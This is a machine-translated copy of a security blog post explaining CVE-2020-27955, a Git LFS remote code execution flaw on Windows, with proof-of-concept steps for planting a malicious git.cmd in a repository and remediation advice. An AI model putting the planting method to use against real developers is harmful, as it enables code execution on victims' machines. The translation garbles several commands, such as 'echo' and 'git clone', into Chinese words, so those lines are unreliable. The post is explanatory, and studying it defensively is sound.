<html>
<head>
<title>Git LFS Exploit for Remote Code Execution | CVE-2020–27955</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">针对远程代码执行的Git LFS漏洞| CVE-2020–27955</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/git-lfs-exploit-for-remote-code-execution-cve-2020-27955-e8f4786163c3?source=collection_archive---------1-----------------------#2020-11-09">https://infosecwriteups.com/git-lfs-exploit-for-remote-code-execution-cve-2020-27955-e8f4786163c3?source=collection_archive---------1-----------------------#2020-11-09</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="f05a" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">针对Windows开发人员的红色警报</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/aae0e848118a2eead1c80eed3b6a67e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5H7KJJ23E5_HtBzUsMCf6A.jpeg"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">GIT LFS上的远程代码执行</figcaption></figure><p id="2a52" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">2020年11月5日，在一个被称为GIT LFS的流行Git扩展上发现了一个严重的漏洞。成功利用此漏洞会导致在目标机器上远程执行代码。如果您或您的组织使用git对您的代码和存储库进行源代码/版本控制，那么您应该考虑到这个问题会对您的资产带来潜在的严重风险。<br/> <br/>在这篇文章中，我们将学习如何手动利用RCE漏洞，并了解git和git-lfs的基础，重现问题的步骤及其补救措施。</p></div><div class="ab cl lr ls hu lt" role="separator"><span class="lu bw bk lv lw lx"/><span class="lu bw bk lv lw lx"/><span class="lu bw bk lv lw"/></div><div class="ij ik il im in"><p id="8303" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir">简介:</strong></p><p id="5f2e" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">Git是SDLC期间最常用的源代码版本控制开源工具。它有助于开发人员在任何一组模块或代码库中相互跟踪和协调。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ly"><img src="../Images/8ca67c758020910bca7aa54d66e59378.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*74nX6JoF9htggnf3e_R8IA.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">来源:<a class="ae lz" href="https://git-scm.com/" rel="noopener ugc nofollow" target="_blank">https://git-scm.com/</a></figcaption></figure><p id="b209" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">当存储库的大小超过兆字节时，git的性能会降低，当存储几兆字节的文件时，GIT会变得相对较慢。为了克服这个限制，Git提供了一个名为GIT LFS的大文件版本扩展。Git大文件存储(LFS)是由GitHub创建的开源工具，它有助于跟踪git存储库中的大文件，而实际的文件内容存储在外部。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ma"><img src="../Images/82363d689ce59f66cd28270a960e81a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o3wUjk8zOKVIC8983M-qvQ.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">来源:<a class="ae lz" href="https://git-lfs.github.com/" rel="noopener ugc nofollow" target="_blank">https://git-lfs.github.com/</a></figcaption></figure><p id="becc" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir">漏洞:</strong></p><p id="59e7" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">在https://nvd.nist.gov/vuln/detail/CVE-2020-27955的Git-LFS (git-lfs)版本&lt;=2.12 on the windows platform only. The payloads get executed as soon as the victim clones the malicious repository and have the vulnerable version of git-lfs running on their system. The attacker must add a malicious file named git.bat/git.cmd/git.vbs/git.exe (any windows executable) in the repo. And the malicious git is executed instead of the original git from the clone path.</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mb"><img src="../Images/bc6a13c1246b4e146fcb85008d65db41.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6xdyqjV8bxywCJdkTapVDA.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">Source: <a class="ae lz" href="https://nvd.nist.gov/vuln/detail/CVE-2020-27955" rel="noopener ugc nofollow" target="_blank">上发现了远程代码执行问题</a></figcaption></figure><p id="5b1b" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">受影响的产品有Git、GitHub CLI、GitHub Desktop、Visual Studio、GitKraden、SmartGit、Sourcetree等。</p><p id="d551" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir">识别漏洞:</strong> <br/>在windows上使用以下命令。如果安装了易受攻击的git-lfs工具，则会提示您使用计算器应用程序。</p><p id="a2ac" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">1.mkdir C:\Windows\Temp\poc</p><p id="08f6" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">2.cd C:\Windows\Temp\poc</p><p id="649f" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">3.回声calc.exe &gt; git . cmd</p><p id="c24c" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">4.git-lfs轨道</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mc"><img src="../Images/4ce8f53b48612cfbf432167968419d3f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wY67dDLjWSgARy84NVOheQ.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">测试本地计算机上的漏洞</figcaption></figure><p id="b6e0" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir">在目标系统上获得RCE</strong></p><p id="d8c5" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">对于远程代码执行，请遵循以下步骤</p><p id="4d67" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">作为攻击者:</p><ol class=""><li id="65d9" class="md me iq kx b ky kz lb lc le mf li mg lm mh lq mi mj mk ml bi translated">在GitHub上创建一个资源库</li></ol><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mm"><img src="../Images/c0b825d97bfdecbf23b1a229690a2c75.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IFkk1LG9QdAHEzlObibydw.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">创建存储库</figcaption></figure><p id="26a4" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">2.cd /dev/shm</p><p id="1bb3" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">3.吉特克隆人<a class="ae lz" href="https://github.com/attacker/poc.git" rel="noopener ugc nofollow" target="_blank">https://github.com/attacker/poc.git</a>。</p><p id="5505" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">4.回声calc.exe &gt; git . cmd</p><p id="3566" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">5.git lfs音轨" *。dat "</p><p id="ee7b" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">6.echo "Junk" &gt; large.dat</p><p id="849a" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">7.git add -A</p><p id="4511" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">8.git commit -m "POC "</p><p id="e2a5" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">9.git push -u origin master -f</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mn"><img src="../Images/9cd59e3f26bbdb61b020e42fda3677bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7yN1B-2RM4Sng7zXeCtTqw.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">制造有效载荷</figcaption></figure><p id="3038" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">受害者:</p><ol class=""><li id="65f6" class="md me iq kx b ky kz lb lc le mf li mg lm mh lq mi mj mk ml bi translated">https://github.com/attacker/poc.git的饭桶克隆人<a class="ae lz" href="https://github.com/attacker/poc.git" rel="noopener ugc nofollow" target="_blank"/>。</li></ol><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mo"><img src="../Images/69451424059276a0cde8581a08cd0d70.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GgA7MVN_BJLBbkCQjpITYQ.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">执行恶意git</figcaption></figure><p id="7a7b" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我还为此创建了一个视频概念验证。如果你有兴趣，也可以看看视频。</p><p id="a8db" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir">补救:</strong></p><p id="c0d8" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">更新并保持git版本高于2.29.2，git-lfs扩展高于2.12</p><div class="mp mq gp gr mr ms"><a href="https://www.youtube.com/@Exploit-Writeup/" rel="noopener  ugc nofollow" target="_blank"><div class="mt ab fo"><div class="mu ab mv cl cj mw"><h2 class="bd ir gy z fp mx fr fs my fu fw ip bi translated">漏洞利用报告</h2><div class="mz l"><h3 class="bd b gy z fp mx fr fs my fu fw dk translated">CTF玩家、安全专家、Bug赏金猎人、白帽黑客和渗透测试者的博客你好，我是…</h3></div><div class="na l"><p class="bd b dl z fp mx fr fs my fu fw dk translated">www.youtube.com</p></div></div><div class="nb l"><div class="nc l nd ne nf nb ng kp ms"/></div></div></a></div></div><div class="ab cl lr ls hu lt" role="separator"><span class="lu bw bk lv lw lx"/><span class="lu bw bk lv lw lx"/><span class="lu bw bk lv lw"/></div><div class="ij ik il im in"><p id="a8b3" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir">免责声明:</strong></p><p id="4b84" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我既没有发现这个严重的漏洞，也没有为CVE(CVE-2020–27955)居功。我只是在分析了各种博客和公共论坛上的描述后制作了这个视频，以帮助安全爱好者了解这个问题。我对使用此漏洞给组织造成的任何损失不负任何责任&amp;我建议用户在没有组织书面同意的情况下不要利用此漏洞，因为它可能会使组织暴露于其他黑客的攻击之下。</p></div></div>    
</body>
</html>